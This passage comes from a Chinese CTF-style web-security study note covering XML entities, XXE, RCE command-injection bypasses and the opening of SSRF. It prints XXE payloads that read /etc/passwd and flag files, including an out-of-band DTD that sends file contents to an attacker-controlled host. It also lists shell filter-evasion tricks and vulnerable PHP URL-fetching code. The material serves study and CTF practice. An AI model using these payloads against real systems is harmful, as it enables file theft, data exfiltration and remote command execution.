name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li>\n<li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li>\n</ul>\n</li>\n<li><p>外部实体</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">note</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> [</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">&amp;c</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span></code></pre></div><ul>\n<li>外部引用可支持http，file等协议</li>\n</ul>\n</li>\n<li><p>外部参数实体</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">note</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\"> [</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &lt;!ENTITY % d SYSTEM &quot;http://47.106.143.26/xml.dtd&quot;&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    %d;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">&amp;d1</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">note</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span></code></pre></div><p><code>http://47.106.143.26/xml.dtd</code>:</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\">&lt;!-- http://47.106.143.26/xml.dtd --&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&lt;!ENTITY d1 SYSTEM &quot;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&quot;&gt;</span></span></code></pre></div></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"XML外部实体注入-XXE\"><a href=\"#XML外部实体注入-XXE\" class=\"headerlink\" title=\"XML外部实体注入(XXE)\"></a>XML外部实体注入(XXE)</h3><h4 id=\"漏洞发现\"><a href=\"#漏洞发现\" class=\"headerlink\" title=\"漏洞发现\"></a>漏洞发现</h4><h5 id=\"黑盒-2\"><a href=\"#黑盒-2\" class=\"headerlink\" title=\"黑盒\"></a>黑盒</h5><ul>\n<li>获取得到Content-Type或数据类型为xml时，尝试进行xml语言payload进行测试</li>\n<li>不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试XXE</li>\n<li>XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行</li>\n</ul>\n<h5 id=\"白盒-2\"><a href=\"#白盒-2\" class=\"headerlink\" title=\"白盒\"></a>白盒</h5><ul>\n<li><p>可通过应用功能追踪代码定位审计</p>\n</li>\n<li><p>可通过脚本特定函数搜索定位审计</p>\n</li>\n<li><p>可通过伪协议玩法绕过相关修复等</p>\n</li>\n</ul>\n<h4 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h4><h5 id=\"有回显\"><a href=\"#有回显\" class=\"headerlink\" title=\"有回显\"></a>有回显</h5><ul>\n<li><p>直接读靶机文件</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #F07178\">xml</span><span style=\"color: #C792EA\"> version</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">1.0</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C792EA\"> encoding</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">UTF-8</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\"> ?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">foo</span><span style=\"color: #89DDFF\"> [ </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">rabbit</span><span style=\"color: #F78C6C\"> SYSTEM </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">file:///flag</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\"> &gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">user</span><span style=\"color: #89DDFF\">&gt;&lt;</span><span style=\"color: #F07178\">username</span><span style=\"color: #89DDFF\">&gt;&amp;</span><span style=\"color: #BABED8\">rabbit</span><span style=\"color: #89DDFF\">;&lt;/</span><span style=\"color: #F07178\">username</span><span style=\"color: #89DDFF\">&gt;&lt;</span><span style=\"color: #F07178\">password</span><span style=\"color: #89DDFF\">&gt;</span><span style=\"color: #BABED8\">123</span><span style=\"color: #89DDFF\">&lt;/</span><span style=\"color: #F07178\">password</span><span style=\"color: #89DDFF\">&gt;&lt;/</span><span style=\"color: #F07178\">user</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div></li>\n<li><p>恶意引入外部参数实体</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;?</span><span style=\"color: #F07178\">xml</span><span style=\"color: #C792EA\"> version</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">1.0</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\"> ?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">test</span><span style=\"color: #89DDFF\"> [</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    &lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> % </span><span style=\"color: #BABED8\">file</span><span style=\"color: #F78C6C\"> SYSTEM </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">http://vps-ip/hack.dtd</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    %file;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">]&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #F07178\">test</span><span style=\"color: #89DDFF\">&gt;&amp;</span><span style=\"color: #BABED8\">hhh</span><span style=\"color: #89DDFF\">;&lt;/</span><span style=\"color: #F07178\">test</span><span style=\"color: #89DDFF\">&gt;</span></span></code></pre></div><p>hack.dtd:</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">&lt;!ENTITY hhh SYSTEM &#39;file:///etc/passwd&#39;&gt;</span></span></code></pre></div></li>\n</ul>\n<h5 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h5><ul>\n<li><p>先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&lt;!</span><span style=\"color: #F78C6C\">DOCTYPE</span><span style=\"color: #89DDFF\"> </span><span style=\"color: #BABED8\">updateProfile</span><span style=\"color: #89DDFF\"> [</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    &lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> % </span><span style=\"color: #BABED8\">file</span><span style=\"color: #F78C6C\"> SYSTEM </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">php://filter/read=convert.base64-encode/resource=./target.php</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    &lt;!</span><span style=\"color: #F78C6C\">ENTITY</span><span style=\"color: #89DDFF\"> % </span><span style=\"color: #BABED8\">dtd</span><span style=\"color: #F78C6C\"> SYSTEM </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">http://xxx.xxx.xxx/evil.dtd</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    %dtd;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">    %send;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">]&gt;</span></span></code></pre></div><p>evil.dtd:</p>\n<div class=\"language-xml\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">xml</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">&lt;!ENTITY % all</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &quot;&lt;!ENTITY </span><span style=\"color: #89DDFF\">&amp;</span><span style=\"color: #BABED8\">#x25</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> send SYSTEM &#39;http://xxx.xxx.xxx/?data=%file;&#39;&gt;&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">%all;</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"利用场景\"><a href=\"#利用场景\" class=\"headerlink\" title=\"利用场景\"></a>利用场景</h3><ul>\n<li><p>svg</p>\n</li>\n<li><p>excel</p>\n<p><a href=\"https://xz.aliyun.com/t/3741\">利用EXCEL进行XXE攻击 - 先知社区 (aliyun.com)</a></p>\n</li>\n</ul>\n<h3 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h3><ul>\n<li>禁用dtd实体引用</li>\n<li>过滤关键词</li>\n</ul>\n<h2 id=\"RCE-–-远程代码执行漏洞\"><a href=\"#RCE-–-远程代码执行漏洞\" class=\"headerlink\" title=\"RCE – 远程代码执行漏洞\"></a>RCE – 远程代码执行漏洞</h2><h3 id=\"原理-2\"><a href=\"#原理-2\" class=\"headerlink\" title=\"原理\"></a>原理</h3><ul>\n<li><p><strong>系统命令执行函数</strong></p>\n<div class=\"language-apl\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">apl</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">system</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">passthru</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">exec</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">shell_exec</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">popen</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">proc_open</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">pcntl_exec</span><span style=\"color: #89DDFF\">()</span></span></code></pre></div></li>\n<li><p><strong>系统命令拼接方式</strong></p>\n<ul>\n<li><code>|</code> , <code>||</code></li>\n<li><code>&amp;</code>, <code>&amp;&amp;</code></li>\n<li><code>;</code></li>\n<li><code>%0a</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"绕过-1\"><a href=\"#绕过-1\" class=\"headerlink\" title=\"绕过\"></a>绕过</h3><p><a href=\"https://blog.csdn.net/jdhellfire/article/details/121969060\">常见操作系统命令注入思路_命令注入 bypass-CSDN博客</a></p>\n<h4 id=\"通配符绕过\"><a href=\"#通配符绕过\" class=\"headerlink\" title=\"通配符绕过\"></a>通配符绕过</h4><div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #82AAFF\">system</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">‘tac fla</span><span style=\"color: #89DDFF\">*</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">php’</span><span style=\"color: #89DDFF\">);</span></span></code></pre></div><h4 id=\"参数逃逸\"><a href=\"#参数逃逸\" class=\"headerlink\" title=\"参数逃逸\"></a>参数逃逸</h4><div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #82AAFF\">eval</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">GET</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">]);&amp;</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">system</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">‘tac flag</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">php’</span><span style=\"color: #89DDFF\">);</span></span></code></pre></div><h4 id=\"包含-伪协议\"><a href=\"#包含-伪协议\" class=\"headerlink\" title=\"包含&amp;伪协议\"></a>包含&amp;伪协议</h4><div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">include</span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">_ GET</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\">]?&gt;</span><span style=\"color: #C792EA\">&amp;</span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">data</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #676E95; font-style: italic\">//text/plain,&lt;?=system(&#39;tac flag.php&#39;);</span><span style=\"color: #89DDFF\">?&gt;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">include</span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">_GET</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\">]?&gt;</span><span style=\"color: #C792EA\">&amp;</span><span style=\"color: #BABED8\">a</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">php</span><span style=\"color: #89DDFF\">:</span><span style=\"color: #676E95; font-style: italic\">//filter/read=convert.base64-encode/resource=flag.php</span></span></code></pre></div><h4 id=\"花括号\"><a href=\"#花括号\" class=\"headerlink\" title=\"花括号{}\"></a>花括号<code>&#123;&#125;</code></h4><ul>\n<li>在Linux bash中还可以使用<code>&#123;xxxx&#125;</code>来执行系统命令</li>\n</ul>\n<div class=\"language-sh\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sh</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">&#123;</span><span style=\"color: #FFCB6B\">cat,flag&#125;</span></span></code></pre></div><h4 id=\"斜杠\"><a href=\"#斜杠\" class=\"headerlink\" title=\"斜杠\"></a>斜杠</h4><ul>\n<li><p>路径 &#x2F;</p>\n</li>\n<li><p>\\是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。</p>\n</li>\n<li><p>也就意味着，我们可以在rce漏洞，过滤掉<code>cat ls</code>等命令时候，直接使用<code>ca\\t</code>来实现绕过</p>\n</li>\n</ul>\n<h4 id=\"空格过滤\"><a href=\"#空格过滤\" class=\"headerlink\" title=\"空格过滤\"></a>空格过滤</h4><ul>\n<li>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</li>\n</ul>\n<h4 id=\"一些命令分隔符\"><a href=\"#一些命令分隔符\" class=\"headerlink\" title=\"一些命令分隔符\"></a>一些命令分隔符</h4><p>linux中：<code>%0a(回车) 、%0d(换行) 、; 、&amp; 、| 、&amp;&amp;、||</code><br>windows中：<code>%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</code></p>\n<h3 id=\"黑名单绕过\"><a href=\"#黑名单绕过\" class=\"headerlink\" title=\"黑名单绕过\"></a>黑名单绕过</h3><h4 id=\"拼接绕过\"><a href=\"#拼接绕过\" class=\"headerlink\" title=\"拼接绕过\"></a>拼接绕过</h4><ul>\n<li>利用偶读拼接方法绕过黑名单：<code>a=fl;b=ag;cat $a$b</code></li>\n<li>利用.拼接绕过(sy.(st).em)</li>\n</ul>\n<h4 id=\"编码绕过\"><a href=\"#编码绕过\" class=\"headerlink\" title=\"编码绕过\"></a>编码绕过</h4><div class=\"language-sh\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sh</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #82AAFF\">echo</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">Y2F0wqAK</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">|</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">base64</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-d</span></span></code></pre></div><h4 id=\"单引号和双引号绕过\"><a href=\"#单引号和双引号绕过\" class=\"headerlink\" title=\"单引号和双引号绕过\"></a>单引号和双引号绕过</h4><div class=\"language-sh\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sh</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">c</span><span style=\"color: #FFCB6B\">&#39;&#39;</span><span style=\"color: #FFCB6B\">t</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">flag</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ca</span><span style=\"color: #FFCB6B\">&quot;&quot;</span><span style=\"color: #FFCB6B\">t</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">flag</span></span></code></pre></div><h4 id=\"利用Shell-特殊变量绕过\"><a href=\"#利用Shell-特殊变量绕过\" class=\"headerlink\" title=\"利用Shell 特殊变量绕过\"></a>利用Shell 特殊变量绕过</h4><p>第一个参数是1，第二个参数是2。而参数不存在时其值为空</p>\n<div class=\"language-sh\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">sh</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">ca$@t</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">fla</span><span style=\"color: #BABED8\">$</span><span style=\"color: #C3E88D\">@g</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ca$1t</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">fla</span><span style=\"color: #BABED8\">$2g</span></span></code></pre></div><h3 id=\"linux中查看文件内容\"><a href=\"#linux中查看文件内容\" class=\"headerlink\" title=\"linux中查看文件内容\"></a>linux中查看文件内容</h3><p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">more:一页一页的显示档案内容</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">less:与 more 类似</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">head:查看头几行</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">tail:查看尾几行</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">nl：显示的时候，顺便输出行号</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">od:以二进制的方式读取档案内容</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">vi:一种编辑器，这个也可以查看</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">vim:一种编辑器，这个也可以查看</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">sort:可以查看</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">uniq:可以查看</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">file -f:报错出具体内容</span></span></code></pre></div><h2 id=\"SSRF-–-服务器端请求伪造\"><a href=\"#SSRF-–-服务器端请求伪造\" class=\"headerlink\" title=\"SSRF – 服务器端请求伪造\"></a>SSRF – 服务器端请求伪造</h2><ul>\n<li>SSRF 形成的原因大都是由于服务端提供了<strong>从其他服务器应用</strong>获取数据的功能且没有对目标地址做过滤与限制。</li>\n</ul>\n<h3 id=\"SSRF漏洞挖掘\"><a href=\"#SSRF漏洞挖掘\" class=\"headerlink\" title=\"SSRF漏洞挖掘\"></a>SSRF漏洞挖掘</h3><h4 id=\"漏洞产生场景\"><a href=\"#漏洞产生场景\" class=\"headerlink\" title=\"漏洞产生场景\"></a>漏洞产生场景</h4><ul>\n<li><p>分享：通过URL地址分享网页内容</p>\n</li>\n<li><p>转码服务: 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n</li>\n<li><p>在线翻译:通过URL地址翻译对应文本的内容</p>\n</li>\n<li><p>图片、文章收藏功能</p>\n</li>\n<li><p>未公开的api实现以及其他调用URL的功能</p>\n</li>\n<li><p>图片加载与下载:通过URL地址加载或下载图片</p>\n</li>\n<li><p>从URL关键字中寻找, 利用google 语法加上这些关键字去寻找SSRF漏洞</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">share wap url link src source target u display sourceURl imageURL domain</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"产生SSRF漏洞的函数\"><a href=\"#产生SSRF漏洞的函数\" class=\"headerlink\" title=\"产生SSRF漏洞的函数\"></a>产生SSRF漏洞的函数</h4><h5 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents\"></a>file_get_contents</h5><p>从指定url获取文件:</p>\n<div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">content </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">file_get_contents</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">]);</span><span style=\"color: #BABED8\"> </span></span></code></pre></div><h5 id=\"fsockopen\"><a href=\"#fsockopen\" class=\"headerlink\" title=\"fsockopen()\"></a>fsockopen()</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">$fp = fsockopen($host, intval($port), $errno, $errstr, 30); </span></span></code></pre></div><h5 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec()\"></a>curl_exec()</h5><div class=\"language-php\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">php</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">link </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">_POST</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">url</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">curlobj </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">curl_init</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">curl_setopt</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> CURLOPT_POST</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">curl_setopt</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\">CURLOPT_URL</span><span style=\"color: #89DDFF\">,$</span><span style=\"color: #BABED8\">link</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">curl_setopt</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> CURLOPT_RETURNTRANSFER</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">result</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">curl_exec</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">curlobj</span><span style=\"color: #89DDFF\">);</span></span></code></pre></div><h3 id=\"SSRF中URL的伪协议\"><a href=\"#SSRF中URL的伪协议\" class=\"headerlink\" title=\"SSRF中URL的伪协议\"></a>SSRF中URL的伪协议</h3><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 